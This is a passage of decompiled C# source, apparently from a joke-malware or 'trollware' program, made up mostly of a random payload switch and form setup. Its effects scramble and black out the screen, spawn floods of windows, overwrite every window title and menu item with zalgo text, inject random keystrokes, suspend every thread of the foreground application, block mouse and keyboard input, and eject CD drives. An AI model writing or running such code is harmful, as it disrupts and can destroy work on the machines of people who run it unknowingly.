            Graphics graphics4 = Graphics.FromImage((Image) bitmap);
            graphics4.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(this.w1, this.h1));
            graphics4.Dispose();
            graphics3.RotateTransform((float) (this.r.NextDouble() * 150.0));
            graphics3.DrawImage((Image) bitmap, new Rectangle(0, 0, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel);
          }
          Form1.ReleaseDC(IntPtr.Zero, dc3);
          break;
        case 27:
          IntPtr dc4 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics5 = Graphics.FromHdc(dc4))
          {
            Bitmap bitmap = new Bitmap(this.w1, this.h1);
            Graphics graphics6 = Graphics.FromImage((Image) bitmap);
            graphics6.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(this.w1, this.h1));
            graphics6.Dispose();
            graphics5.ScaleTransform((float) (this.r.NextDouble() * 6.0 - 3.0), (float) (this.r.NextDouble() * 6.0 - 3.0));
            graphics5.DrawImage((Image) bitmap, new Rectangle(0, 0, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel);
          }
          Form1.ReleaseDC(IntPtr.Zero, dc4);
          break;
        case 28:
          this.mouseEff3 = true;
          break;
        case 29:
          IntPtr dc5 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics7 = Graphics.FromHdc(dc5))
          {
            Bitmap bitmap = new Bitmap(this.w1, this.h1);
            Graphics graphics8 = Graphics.FromImage((Image) bitmap);
            graphics8.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(this.w1, this.h1));
            graphics8.Dispose();
            graphics7.ScaleTransform(-1f, 1f);
            graphics7.DrawImage((Image) bitmap, new Rectangle(0, 0, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel);
          }
          Form1.ReleaseDC(IntPtr.Zero, dc5);
          break;
        case 30:
          new Form7().Show();
          break;
        case 31 /*0x1F*/:
          new Form8().Show();
          break;
        case 32 /*0x20*/:
          for (int index = 0; index < this.r.Next(30, 60); ++index)
          {
            new Form9().Show();
            Thread.Sleep(20);
          }
          break;
        case 33:
          this.PlayBeep((ushort) 1000, 100, loop: false);
          break;
        case 34:
          IntPtr dc6 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics = Graphics.FromHdc(dc6))
          {
            for (int index = 0; index < 60; ++index)
            {
              Icon icon = (Icon) null;
              switch (this.r.Next(6))
              {
                case 0:
                  icon = SystemIcons.Application;
                  break;
                case 1:
                  icon = SystemIcons.WinLogo;
                  break;
                case 2:
                  icon = SystemIcons.Hand;
                  break;
                case 3:
                  icon = SystemIcons.Warning;
                  break;
                case 4:
                  icon = SystemIcons.Question;
                  break;
                case 5:
                  icon = SystemIcons.Information;
                  break;
              }
              graphics.DrawIcon(icon, this.r.Next(0, this.w1), this.r.Next(0, this.h1));
            }
          }
          Form1.ReleaseDC(IntPtr.Zero, dc6);
          break;
        case 35:
          Desktop.SaveDesktop();
          int length = Desktop.m_OriginalPoint.Length;
          IntPtr sysLvHwnd = Desktop.GetSysLVHwnd();
          for (int wParam = 0; wParam < length; ++wParam)
            Desktop.SendMessage(sysLvHwnd, 4111, wParam, Form1.MakeLParam(this.r.Next(0, this.w1), this.r.Next(0, this.h1)));
          break;
        case 36:
          this.wtfEff1 = true;
          break;
        case 37:
          this.wtfEff2 = true;
          break;
        case 38:
          this.wtfEff3 = true;
          break;
        case 39:
          Desktop.EnumWindows((Desktop.EnumWindowsProc) ((hwnd, lParam) =>
          {
            foreach (IntPtr childrenWindowHandle in Form1.GetAllChildrenWindowHandles(hwnd, int.MaxValue))
            {
              try
              {
                Form1.SendMessage(childrenWindowHandle, 12U, IntPtr.Zero, ".͉͈̲̝͖̠̮͉̲͔̐̅̋̉͌̑̓̅̇ͦ̾̅̒́̒̕͡ͅ.̼͙̻̤̼̥̥̤̘ͪ̾͌̑͘.̷̨̖͍̯̮̠̤̥̤̭͔͙̱͙̬̮̞̓̏̓̆̑͗̐͑́͐͒̓͑̊͠ͅ.̻̹̹̘̹̟̙̺͛ͮ̆ͯͬ͗̍͂̄͋̅̿͐̓̍ͣ̏͜͟͟͢.̵̖̩͇͎̘ͧ̀̏̽ͫͩ͋̃̈́͒̑ͤ̑͒̽̚.̞͍̮̱̼̜͎͎ͯ̋̊̐͊̽̓̉̇͂ͦ̀̚͘͘͘.̡͓̯͉̼̳̖̯̟̲͎̲̓͂̂͆̆ͬ̕.̢͈̩̺̼̪̟̤̳̜̝͚̳̄̊̓ͦ̿̚͜ͅͅ.̸̖͔̤̠̳̗̙̟̣͚̓ͭ̿ͬ̏͒̃̎́͟͠͡͝.̴̴̬̲͕̤̣̼̣̮̫̮̮̙͚͊͛ͧ̅̂͌̇̊ͯ͘͞.̶̶̨̹̞̪̼̏ͬͥ̉̄͑̍͗̂ͧ̿͒͢.̶̨̤̙̗͓͚̱̙̲̗͈̻̹̆̆̐̋͂͆̐̀͌ͩͨͯ̂ͣ̈̾ͅ.̅ͬ͛̍̽̓͋ͧ͛̊̔̊̎͘͏̸̼̘̬̪͈͉̠͇͔̖͙́͠ͅ.̢̧̝̟͓̝̘̞̬̠͈͚̭͔̝̺̩̖̦̝ͣͧ̊̿ͤ̅̿̓̄̍ͥͪͪ́̏͗ͨͤ̀̚.̵͉͍̪͈͕͇̦̩͂ͮ̃ͣ͛̔ͥͨ̉̾̈́.̛͍̳̙̤͉̳̬͈̩̹̼̘̝̪͕̖̉̀̌ͭ̓ͬ̐̅̆́̑ͫ̅̀.̒͒̌̉҉̥̠̻̮̣͖̯̤.̷͖̜̺̲̙͉͇̘̺̳̻͈͔̓̅ͬ̄̃̅̎̏̚͘͜͡͞.ͣ̽̄͑̐̔́ͯ̀́͒͊͌ͪ҉̢̢̪̳̜͖̫͈͓.̶͚̣̫̟͖̗͕͖͎̼̮̰̲̖͍͖̻͊͑̓͊ͬͧ͂̓̓ͧ̊̾̒̽ͭͪͅͅ.̨̦̗̖̱͎̺͎̥̬̯̺͚̪͊̑́ͥ̕͟͢͡.̤̗̗̯͎̩̣̙̫͖̺ͧ̇̒͌͂ͪ̊͗̓̔͞.̓̋̅̃͆̏ͬ̽͞҉̀͏̥̺͚̩̜͈̱̠.̴̧̖͔̮̝͉̺̲̤̬̹͍̭̙̰ͪͬ̂ͮ̑͑̉͂̍̋͑̉.̧̧̰̖̝̳͖̱̥͈̳̓̈̃ͤ͋̌̉͗́͘͠ͅ.̶̡̨̰̮̝̠̣̮̗̬̺͉̘̻̼̻̱̞͓̪͐́̇͛͑ͦͫ̔̆̓ͩ̌.̨̨̯̟͔̹̺̝̱̖̩̜̹̮͛ͮ̔̚.̇̐ͣ̽̃ͩ͏̛̲͇̟̬̪̹̯̱̗͢.̢̥̜̝̼̜͎̪̦̯͎̣̥̭͈͇̦͇͗͌͛ͧ̽̑ͮͤ̐͢͝ͅ.̴̶̧͙̮̞̗͖̫͕̠͍̠͖̖̜͉̜̈́͗ͪ̿̊ͯ̔͊͗ͣ͐̉̐͐͋ͮ͜͠ͅ.̷͐͛͗̓͊ͥ̇̈́ͪ̋̿͆̏ͦ̆̒̈́̇̚҉̛̬̲͈̥͇͉͉̙͓̖̬̞̼̪͍̰̗͝͡.̉̀̐ͬ̈ͭ̅҉̼̣̫̜̫̝̯͇͉̰̟̫͓̩̙͈͜.̨̇̿ͥ͛͒ͬ͊̓ͫͫ͛͠͏̺̥͚̻̪̺̮̺̥̜̜͉̥͈͍ͅ.̸̳̦͚̜̘̬̜͎̯̠̤̩̀̽̽͗͒͆̊͛̿́̈̓̑̀ͬ̎͢.̢͓͚̖̦͕̉͊̿̉̈́ͩ͐̓̀̚.̷̦͕͕͇̝̮͇̗͉̜̩͊ͪͬ̒̋̐͊ͣͪ͊̑̎ͥͭ͗̀̚̚͜͝.̧͊̉̉̄ͭ̊ͥ̅͊̉ͣ̇̐͏͈͉͕̳͓̜͔̖͇͍̮.̸̢̡̍̃̾̎̉̏҉̛̠̫̞̖̦");
                Desktop.SendMessage(childrenWindowHandle, 20, 0, 0);
                this.checkMenu(childrenWindowHandle);
              }
              catch (Exception ex)
              {
              }
            }
            try
            {
              Form1.SendMessage(hwnd, 12U, IntPtr.Zero, ".͉͈̲̝͖̠̮͉̲͔̐̅̋̉͌̑̓̅̇ͦ̾̅̒́̒̕͡ͅ.̼͙̻̤̼̥̥̤̘ͪ̾͌̑͘.̷̨̖͍̯̮̠̤̥̤̭͔͙̱͙̬̮̞̓̏̓̆̑͗̐͑́͐͒̓͑̊͠ͅ.̻̹̹̘̹̟̙̺͛ͮ̆ͯͬ͗̍͂̄͋̅̿͐̓̍ͣ̏͜͟͟͢.̵̖̩͇͎̘ͧ̀̏̽ͫͩ͋̃̈́͒̑ͤ̑͒̽̚.̞͍̮̱̼̜͎͎ͯ̋̊̐͊̽̓̉̇͂ͦ̀̚͘͘͘.̡͓̯͉̼̳̖̯̟̲͎̲̓͂̂͆̆ͬ̕.̢͈̩̺̼̪̟̤̳̜̝͚̳̄̊̓ͦ̿̚͜ͅͅ.̸̖͔̤̠̳̗̙̟̣͚̓ͭ̿ͬ̏͒̃̎́͟͠͡͝.̴̴̬̲͕̤̣̼̣̮̫̮̮̙͚͊͛ͧ̅̂͌̇̊ͯ͘͞.̶̶̨̹̞̪̼̏ͬͥ̉̄͑̍͗̂ͧ̿͒͢.̶̨̤̙̗͓͚̱̙̲̗͈̻̹̆̆̐̋͂͆̐̀͌ͩͨͯ̂ͣ̈̾ͅ.̅ͬ͛̍̽̓͋ͧ͛̊̔̊̎͘͏̸̼̘̬̪͈͉̠͇͔̖͙́͠ͅ.̢̧̝̟͓̝̘̞̬̠͈͚̭͔̝̺̩̖̦̝ͣͧ̊̿ͤ̅̿̓̄̍ͥͪͪ́̏͗ͨͤ̀̚.̵͉͍̪͈͕͇̦̩͂ͮ̃ͣ͛̔ͥͨ̉̾̈́.̛͍̳̙̤͉̳̬͈̩̹̼̘̝̪͕̖̉̀̌ͭ̓ͬ̐̅̆́̑ͫ̅̀.̒͒̌̉҉̥̠̻̮̣͖̯̤.̷͖̜̺̲̙͉͇̘̺̳̻͈͔̓̅ͬ̄̃̅̎̏̚͘͜͡͞.ͣ̽̄͑̐̔́ͯ̀́͒͊͌ͪ҉̢̢̪̳̜͖̫͈͓.̶͚̣̫̟͖̗͕͖͎̼̮̰̲̖͍͖̻͊͑̓͊ͬͧ͂̓̓ͧ̊̾̒̽ͭͪͅͅ.̨̦̗̖̱͎̺͎̥̬̯̺͚̪͊̑́ͥ̕͟͢͡.̤̗̗̯͎̩̣̙̫͖̺ͧ̇̒͌͂ͪ̊͗̓̔͞.̓̋̅̃͆̏ͬ̽͞҉̀͏̥̺͚̩̜͈̱̠.̴̧̖͔̮̝͉̺̲̤̬̹͍̭̙̰ͪͬ̂ͮ̑͑̉͂̍̋͑̉.̧̧̰̖̝̳͖̱̥͈̳̓̈̃ͤ͋̌̉͗́͘͠ͅ.̶̡̨̰̮̝̠̣̮̗̬̺͉̘̻̼̻̱̞͓̪͐́̇͛͑ͦͫ̔̆̓ͩ̌.̨̨̯̟͔̹̺̝̱̖̩̜̹̮͛ͮ̔̚.̇̐ͣ̽̃ͩ͏̛̲͇̟̬̪̹̯̱̗͢.̢̥̜̝̼̜͎̪̦̯͎̣̥̭͈͇̦͇͗͌͛ͧ̽̑ͮͤ̐͢͝ͅ.̴̶̧͙̮̞̗͖̫͕̠͍̠͖̖̜͉̜̈́͗ͪ̿̊ͯ̔͊͗ͣ͐̉̐͐͋ͮ͜͠ͅ.̷͐͛͗̓͊ͥ̇̈́ͪ̋̿͆̏ͦ̆̒̈́̇̚҉̛̬̲͈̥͇͉͉̙͓̖̬̞̼̪͍̰̗͝͡.̉̀̐ͬ̈ͭ̅҉̼̣̫̜̫̝̯͇͉̰̟̫͓̩̙͈͜.̨̇̿ͥ͛͒ͬ͊̓ͫͫ͛͠͏̺̥͚̻̪̺̮̺̥̜̜͉̥͈͍ͅ.̸̳̦͚̜̘̬̜͎̯̠̤̩̀̽̽͗͒͆̊͛̿́̈̓̑̀ͬ̎͢.̢͓͚̖̦͕̉͊̿̉̈́ͩ͐̓̀̚.̷̦͕͕͇̝̮͇̗͉̜̩͊ͪͬ̒̋̐͊ͣͪ͊̑̎ͥͭ͗̀̚̚͜͝.̧͊̉̉̄ͭ̊ͥ̅͊̉ͣ̇̐͏͈͉͕̳͓̜͔̖͇͍̮.̸̢̡̍̃̾̎̉̏҉̛̠̫̞̖̦");
              Desktop.SendMessage(hwnd, 20, 0, 0);
              this.checkMenu(hwnd);
            }
            catch (Exception ex)
            {
            }
            return true;
          }), IntPtr.Zero);
          break;
        case 40:
          string t__ = "";
          for (int index = 0; index < this.r.Next(1, 8); ++index)
            t__ += this.randToken();
          try
          {
            SendKeys.Send(t__);
            break;
          }
          catch (Exception ex)
          {
            new Thread((ThreadStart) (() => SendKeys.SendWait(t__))).Start();
            break;
          }
        case 41:
          IntPtr dc7 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics9 = Graphics.FromHdc(dc7))
          {
            for (int index = 0; index < 20; ++index)
            {
              int x1 = this.r.Next(0, this.w1);
              int y1 = this.r.Next(0, this.h1);
              int x2 = this.r.Next(0, this.w1);
              int y2 = this.r.Next(0, this.h1);
              int width = this.r.Next(0, this.w1);
              int height = this.r.Next(0, this.h1);
              if (x1 + width >= this.w1)
                width = this.w1 - x1 - 1;
              if (y1 + height >= y1)
                height = this.h1 - y1 - 1;
              Bitmap bitmap = new Bitmap(width, height);
              Graphics graphics10 = Graphics.FromImage((Image) bitmap);
              graphics10.CopyFromScreen(new Point(x1, y1), new Point(0, 0), new Size(width, height));
              graphics10.Dispose();
              graphics9.ScaleTransform(-1f, 1f);
              graphics9.DrawImage((Image) bitmap, new Rectangle(x2, y2, bitmap.Width, bitmap.Height), 0, 0, bitmap.Width, bitmap.Height, GraphicsUnit.Pixel);
            }
          }
          Form1.ReleaseDC(IntPtr.Zero, dc7);
          break;
        case 42:
          this.wtfEff4 = true;
          break;
        case 43:
          uint ProcessId = 0;
          Form1.GetWindowThreadProcessId(Form1.GetForegroundWindow(), out ProcessId);
          IEnumerator enumerator3 = Process.GetProcessById((int) ProcessId).Threads.GetEnumerator();
          try
          {
            while (enumerator3.MoveNext())
            {
              IntPtr hThread = Form1.OpenThread(3U, false, Convert.ToUInt32(((ProcessThread) enumerator3.Current).Id));
              try
              {
                for (int index = 1; index <= 30; ++index)
                {
                  try
                  {
                    Form1.SuspendThread(hThread);
                  }
                  catch (Exception ex)
                  {
                  }
                }
              }
              catch (Exception ex)
              {
              }
            }
            break;
          }
          finally
          {
            if (enumerator3 is IDisposable disposable)
              disposable.Dispose();
          }
        case 44:
          Form1.BlockInput(true);
          new Thread((ThreadStart) (() =>
          {
            Thread.Sleep(this.r.Next(500, 5000));
            Form1.BlockInput(false);
          })).Start();
          break;
        case 45:
          foreach (DriveInfo drive in DriveInfo.GetDrives())
          {
            if (drive.DriveType == DriveType.CDRom)
            {
              string str = drive.Name.Substring(0, 1);
              Form1.mciSendStringA($"open {str}: type CDaudio alias drive{str}", IntPtr.Zero, 0, 0);
              Form1.mciSendStringA($"set drive{str} door open", IntPtr.Zero, 0, 0);
            }
          }
          break;
        case 46:
          Form1.keybd_event((byte) 144 /*0x90*/, (byte) 69, 1U, (UIntPtr) 0UL);
          Form1.keybd_event((byte) 144 /*0x90*/, (byte) 69, 3U, (UIntPtr) 0UL);
          break;
        case 47:
          Form1.keybd_event((byte) 20, (byte) 69, 1U, (UIntPtr) 0UL);
          Form1.keybd_event((byte) 20, (byte) 69, 3U, (UIntPtr) 0UL);
          break;
        case 48 /*0x30*/:
          Form1.keybd_event((byte) 145, (byte) 69, 1U, (UIntPtr) 0UL);
          Form1.keybd_event((byte) 145, (byte) 69, 3U, (UIntPtr) 0UL);
          break;
        case 49:
          IEnumerator enumerator4 = Form1.GetWindows().GetEnumerator();
          try
          {
            while (enumerator4.MoveNext())
            {
              IntPtr current = (IntPtr) enumerator4.Current;
              try
              {
                Form1.ShowWindowAsync(current, 1);
              }
              catch (Exception ex)
              {
              }
            }
            break;
          }
          finally
          {
            if (enumerator4 is IDisposable disposable)
              disposable.Dispose();
          }
        case 50:
          IntPtr dc8 = Form1.GetDC(IntPtr.Zero);
          using (Graphics graphics = Graphics.FromHdc(dc8))
            graphics.Clear(Color.Black);
          Form1.ReleaseDC(IntPtr.Zero, dc8);
          break;
        case 51:
          this.wtfEff5 = true;
          break;
      }
    }
    catch (Exception ex)
    {
      if (!Program.debugmode)
        return;
      int num = (int) MessageBox.Show(ex.ToString());
    }
  }

  [DllImport("user32.dll")]
  private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

  [DllImport("user32.dll")]
  private static extern bool BlockInput(bool fBlockIt);

  [DllImport("user32.dll")]
  public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

  [DllImport("winmm.dll", EntryPoint = "mciSendString")]
  public static extern int mciSendStringA(
    string lpstrCommand,
    IntPtr lpstrReturnString,
    int uReturnLength,
    int hwndCallback);

  [DllImport("kernel32.dll")]
  private static extern IntPtr OpenThread(
    uint dwDesiredAccess,
    bool bInheritHandle,
    uint dwThreadId);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern int SuspendThread(IntPtr hThread);

  private string randToken()
  {
    int index = this.r.Next(this.specs.Length + 62);
    return index < this.specs.Length ? this.specs[index] : char.ToString(this.specc[index - this.specs.Length]);
  }

  [DllImport("user32.dll")]
  private static extern bool IsMenu(IntPtr hMenu);

  [DllImport("user32.dll")]
  private static extern int GetMenuItemCount(IntPtr hMenu);

  private void checkMenu(IntPtr hWnd)
  {
    IntPtr hMenu = (IntPtr) Desktop.SendMessage(hWnd, 481, 0, 0);
    if (!Form1.IsMenu(hMenu))
      return;
    int menuItemCount = Form1.GetMenuItemCount(hMenu);
    for (uint uItem = 0; (long) uItem < (long) menuItemCount; ++uItem)
    {
      Form1.MENUITEMINFO lpmii = new Form1.MENUITEMINFO();
      lpmii.fMask = 64U /*0x40*/;
      lpmii.fType = 0U;
      lpmii.dwTypeData = IntPtr.Zero;
      if (!Form1.GetMenuItemInfo(hMenu, uItem, true, out lpmii))
        break;
      ++lpmii.cch;
      lpmii.dwTypeData = Marshal.AllocHGlobal((IntPtr) (long) (lpmii.cch * 2U));
      try
      {
        if (!Form1.GetMenuItemInfo(hMenu, uItem, true, out lpmii))
          break;
        Marshal.PtrToStringUni(lpmii.dwTypeData);
        string s = this.fit(".͉͈̲̝͖̠̮͉̲͔̐̅̋̉͌̑̓̅̇ͦ̾̅̒́̒̕͡ͅ.̼͙̻̤̼̥̥̤̘ͪ̾͌̑͘.̷̨̖͍̯̮̠̤̥̤̭͔͙̱͙̬̮̞̓̏̓̆̑͗̐͑́͐͒̓͑̊͠ͅ.̻̹̹̘̹̟̙̺͛ͮ̆ͯͬ͗̍͂̄͋̅̿͐̓̍ͣ̏͜͟͟͢.̵̖̩͇͎̘ͧ̀̏̽ͫͩ͋̃̈́͒̑ͤ̑͒̽̚.̞͍̮̱̼̜͎͎ͯ̋̊̐͊̽̓̉̇͂ͦ̀̚͘͘͘.̡͓̯͉̼̳̖̯̟̲͎̲̓͂̂͆̆ͬ̕.̢͈̩̺̼̪̟̤̳̜̝͚̳̄̊̓ͦ̿̚͜ͅͅ.̸̖͔̤̠̳̗̙̟̣͚̓ͭ̿ͬ̏͒̃̎́͟͠͡͝.̴̴̬̲͕̤̣̼̣̮̫̮̮̙͚͊͛ͧ̅̂͌̇̊ͯ͘͞.̶̶̨̹̞̪̼̏ͬͥ̉̄͑̍͗̂ͧ̿͒͢.̶̨̤̙̗͓͚̱̙̲̗͈̻̹̆̆̐̋͂͆̐̀͌ͩͨͯ̂ͣ̈̾ͅ.̅ͬ͛̍̽̓͋ͧ͛̊̔̊̎͘͏̸̼̘̬̪͈͉̠͇͔̖͙́͠ͅ.̢̧̝̟͓̝̘̞̬̠͈͚̭͔̝̺̩̖̦̝ͣͧ̊̿ͤ̅̿̓̄̍ͥͪͪ́̏͗ͨͤ̀̚.̵͉͍̪͈͕͇̦̩͂ͮ̃ͣ͛̔ͥͨ̉̾̈́.̛͍̳̙̤͉̳̬͈̩̹̼̘̝̪͕̖̉̀̌ͭ̓ͬ̐̅̆́̑ͫ̅̀.̒͒̌̉҉̥̠̻̮̣͖̯̤.̷͖̜̺̲̙͉͇̘̺̳̻͈͔̓̅ͬ̄̃̅̎̏̚͘͜͡͞.ͣ̽̄͑̐̔́ͯ̀́͒͊͌ͪ҉̢̢̪̳̜͖̫͈͓.̶͚̣̫̟͖̗͕͖͎̼̮̰̲̖͍͖̻͊͑̓͊ͬͧ͂̓̓ͧ̊̾̒̽ͭͪͅͅ.̨̦̗̖̱͎̺͎̥̬̯̺͚̪͊̑́ͥ̕͟͢͡.̤̗̗̯͎̩̣̙̫͖̺ͧ̇̒͌͂ͪ̊͗̓̔͞.̓̋̅̃͆̏ͬ̽͞҉̀͏̥̺͚̩̜͈̱̠.̴̧̖͔̮̝͉̺̲̤̬̹͍̭̙̰ͪͬ̂ͮ̑͑̉͂̍̋͑̉.̧̧̰̖̝̳͖̱̥͈̳̓̈̃ͤ͋̌̉͗́͘͠ͅ.̶̡̨̰̮̝̠̣̮̗̬̺͉̘̻̼̻̱̞͓̪͐́̇͛͑ͦͫ̔̆̓ͩ̌.̨̨̯̟͔̹̺̝̱̖̩̜̹̮͛ͮ̔̚.̇̐ͣ̽̃ͩ͏̛̲͇̟̬̪̹̯̱̗͢.̢̥̜̝̼̜͎̪̦̯͎̣̥̭͈͇̦͇͗͌͛ͧ̽̑ͮͤ̐͢͝ͅ.̴̶̧͙̮̞̗͖̫͕̠͍̠͖̖̜͉̜̈́͗ͪ̿̊ͯ̔͊͗ͣ͐̉̐͐͋ͮ͜͠ͅ.̷͐͛͗̓͊ͥ̇̈́ͪ̋̿͆̏ͦ̆̒̈́̇̚҉̛̬̲͈̥͇͉͉̙͓̖̬̞̼̪͍̰̗͝͡.̉̀̐ͬ̈ͭ̅҉̼̣̫̜̫̝̯͇͉̰̟̫͓̩̙͈͜.̨̇̿ͥ͛͒ͬ͊̓ͫͫ͛͠͏̺̥͚̻̪̺̮̺̥̜̜͉̥͈͍ͅ.̸̳̦͚̜̘̬̜͎̯̠̤̩̀̽̽͗͒͆̊͛̿́̈̓̑̀ͬ̎͢.̢͓͚̖̦͕̉͊̿̉̈́ͩ͐̓̀̚.̷̦͕͕͇̝̮͇̗͉̜̩͊ͪͬ̒̋̐͊ͣͪ͊̑̎ͥͭ͗̀̚̚͜͝.̧͊̉̉̄ͭ̊ͥ̅͊̉ͣ̇̐͏͈͉͕̳͓̜͔̖͇͍̮.̸̢̡̍̃̾̎̉̏҉̛̠̫̞̖̦", lpmii.cch);
        byte[] numArray = new byte[Encoding.UTF8.GetByteCount(s) + 1];
        Encoding.UTF8.GetBytes(s, 0, s.Length, numArray, 0);
        Marshal.Copy(numArray, 0, lpmii.dwTypeData, numArray.Length);
        Form1.SetMenuItemInfo(hMenu, uItem, true, ref lpmii);
      }
      finally
      {
        Marshal.FreeHGlobal(lpmii.dwTypeData);
      }
    }
  }

  private string fit(string v, uint cch)
  {
    if ((long) v.Length == (long) cch)
      return v;
    if ((long) v.Length > (long) cch)
      return v.Substring(0, (int) cch);
    string str = "";
    for (; cch >= 0U; cch -= (uint) v.Length)
      str += v;
    return str.Substring(0, (int) cch);
  }

  public void slowTimer()
  {
    this.timer2.Interval = 30000;
    this.timer3.Interval = 30000;
  }

  [DllImport("coredll", SetLastError = true)]
  private static extern bool SetMenuItemInfo(
    IntPtr hMenu,
    uint uItem,
    [MarshalAs(UnmanagedType.Bool)] bool fByPosition,
    ref Form1.MENUITEMINFO lpmii);

  [DllImport("coredll", SetLastError = true)]
  private static extern bool GetMenuItemInfo(
    IntPtr hMenu,
    uint uItem,
    [MarshalAs(UnmanagedType.Bool)] bool fByPosition,
    out Form1.MENUITEMINFO lpmii);

  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);

  public static IntPtr MakeLParam(int wLow, int wHigh)
  {
    return (IntPtr) ((int) (short) wHigh << 16 /*0x10*/ | wLow & (int) ushort.MaxValue);
  }

  [DllImport("User32.dll")]
  private static extern IntPtr GetDC(IntPtr hwnd);

  [DllImport("User32.dll")]
  private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

  private void Form1_Load(object sender, EventArgs e) => Application.DoEvents();

  private void timer3_Tick(object sender, EventArgs e)
  {
    if (this.direct)
    {
      this.Close();
    }
    else
    {
      this.timer2.Start();
      this.timer3.Stop();
      this.timer2_Tick((object) null, new EventArgs());
      Application.DoEvents();
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool EnumWindows(Form1.EnumedWindow lpEnumFunc, ArrayList lParam);

  public static ArrayList GetWindows()
  {
    ArrayList lParam = new ArrayList();
    Form1.EnumWindows(new Form1.EnumedWindow(Form1.GetWindowHandle), lParam);
    return lParam;
  }

  private static bool GetWindowHandle(IntPtr windowHandle, ArrayList windowHandles)
  {
    windowHandles.Add((object) windowHandle);
    return true;
  }

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    this.button1 = new Button();
    this.timer1 = new System.Windows.Forms.Timer(this.components);
    this.button2 = new Button();
    this.button3 = new Button();
    this.button4 = new Button();
    this.button5 = new Button();
    this.button6 = new Button();
    this.button7 = new Button();
    this.button8 = new Button();
    this.button9 = new Button();
    this.button10 = new Button();
    this.button11 = new Button();
    this.button12 = new Button();
    this.button13 = new Button();
    this.button14 = new Button();
    this.button15 = new Button();
    this.timer2 = new System.Windows.Forms.Timer(this.components);
    this.timer3 = new System.Windows.Forms.Timer(this.components);
    this.SuspendLayout();
    this.button1.Location = new Point(12, 12);
    this.button1.Name = "button1";
    this.button1.Size = new Size(194, 68);
    this.button1.TabIndex = 0;
    this.button1.Text = "mouse 1";
    this.button1.UseVisualStyleBackColor = true;
    this.button1.Click += new EventHandler(this.button1_Click);
    this.timer1.Enabled = true;
    this.timer1.Interval = 30;
    this.timer1.Tick += new EventHandler(this.timer1_Tick);
    this.button2.Location = new Point(12, 87);
    this.button2.Name = "button2";
    this.button2.Size = new Size(194, 68);
    this.button2.TabIndex = 1;
    this.button2.Text = "mouse 2";
    this.button2.UseVisualStyleBackColor = true;
    this.button2.Click += new EventHandler(this.button2_Click);
    this.button3.Location = new Point(212, 12);
    this.button3.Name = "button3";
    this.button3.Size = new Size(194, 68);
    this.button3.TabIndex = 2;
    this.button3.Text = "window 1";
    this.button3.UseVisualStyleBackColor = true;
    this.button3.Click += new EventHandler(this.button3_Click);
    this.button4.Location = new Point(212, 87);
    this.button4.Name = "button4";
    this.button4.Size = new Size(194, 68);
    this.button4.TabIndex = 3;
    this.button4.Text = "window 2";
    this.button4.UseVisualStyleBackColor = true;
    this.button4.Click += new EventHandler(this.button4_Click);
    this.button5.Location = new Point(412, 12);
    this.button5.Name = "button5";
    this.button5.Size = new Size(194, 68);
    this.button5.TabIndex = 4;
    this.button5.Text = "audio 1";
    this.button5.UseVisualStyleBackColor = true;
    this.button5.Click += new EventHandler(this.button5_Click);
    this.button6.Location = new Point(412, 87);
    this.button6.Name = "button6";
    this.button6.Size = new Size(194, 68);
    this.button6.TabIndex = 5;
    this.button6.Text = "audio 2";
    this.button6.UseVisualStyleBackColor = true;
    this.button6.Click += new EventHandler(this.button6_Click);
    this.button7.Location = new Point(412, 162);
    this.button7.Name = "button7";
    this.button7.Size = new Size(194, 68);
    this.button7.TabIndex = 6;
    this.button7.Text = "audio 3";
    this.button7.UseVisualStyleBackColor = true;
    this.button7.Click += new EventHandler(this.button7_Click);
    this.button8.Location = new Point(411, 234);
    this.button8.Name = "button8";
    this.button8.Size = new Size(194, 68);
    this.button8.TabIndex = 7;
    this.button8.Text = "audio 4";
    this.button8.UseVisualStyleBackColor = true;
    this.button8.Click += new EventHandler(this.button8_Click);
    this.button9.Location = new Point(12, 162);
    this.button9.Name = "button9";
    this.button9.Size = new Size(194, 68);
    this.button9.TabIndex = 8;
    this.button9.Text = "gfx 1 ";
    this.button9.UseVisualStyleBackColor = true;
    this.button9.Click += new EventHandler(this.button9_Click);
    this.button10.Location = new Point(12, 234);
    this.button10.Name = "button10";
    this.button10.Size = new Size(194, 68);
    this.button10.TabIndex = 9;
    this.button10.Text = "gfx 2";
    this.button10.UseVisualStyleBackColor = true;
    this.button10.Click += new EventHandler(this.button10_Click);
    this.button11.Location = new Point(12, 310);
    this.button11.Name = "button11";
    this.button11.Size = new Size(194, 68);
    this.button11.TabIndex = 10;
    this.button11.Text = "gfx 3";
    this.button11.UseVisualStyleBackColor = true;
    this.button11.Click += new EventHandler(this.button11_Click);
    this.button12.Location = new Point(212, 310);
    this.button12.Name = "button12";
    this.button12.Size = new Size(194, 68);
    this.button12.TabIndex = 11;
    this.button12.Text = "video";
    this.button12.UseVisualStyleBackColor = true;
    this.button12.Click += new EventHandler(this.button12_Click);
    this.button13.Location = new Point(212, 161);
    this.button13.Name = "button13";
    this.button13.Size = new Size(194, 68);
    this.button13.TabIndex = 12;
    this.button13.Text = "window 3";
    this.button13.UseVisualStyleBackColor = true;
    this.button13.Click += new EventHandler(this.button13_Click);
    this.button14.Location = new Point(212, 234);
    this.button14.Name = "button14";
